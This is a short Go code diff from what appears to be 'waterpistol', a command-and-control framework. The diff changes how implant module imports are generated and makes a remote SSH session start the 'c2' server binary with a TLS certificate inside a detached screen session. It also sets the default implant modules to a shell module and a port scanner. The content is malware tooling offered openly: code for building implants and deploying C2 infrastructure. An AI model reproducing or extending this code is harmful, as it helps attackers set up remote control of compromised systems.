@@ -47,7 +47,7 @@ func (waterpistol *waterpistol) preprocess_file(data []byte) []byte {
 	modules_import := ""
 	for _, module := range waterpistol.modules {
 		modules_create += module + ".Create(),\n"
-		modules_import += waterpistol.srcid + "/" + module + "\n"
+		modules_import += "\"" + waterpistol.srcid + "/implant/" + module + "\"\n"
 	}
 	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_IMPORT_", modules_import, -1)
 	sdata = strings.Replace(sdata, "_INCLUDED_MODULES_", modules_create, -1)
@@ -153,7 +153,7 @@ func (waterpistol *waterpistol) uploadC2(loc string, priv_key string) error {
 
 	fmt.Println("Running c2")
 
-	err = session.Run("screen -d -m -S c2 bash")
+	err = session.Run("screen -d -m -S c2 ./c2 crt.crt key.key")
 	if err != nil {
 		return err
 	}
@@ -210,6 +210,6 @@ func (waterpistol *waterpistol) compile_c2_implant() {
 
 func main() {
 	rand.Seed(time.Now().UTC().UnixNano())
-	waterpistol := &waterpistol{}
+	waterpistol := &waterpistol{modules: []string{"sh", "portscan"}}
 	waterpistol.compile_c2_implant()
 }
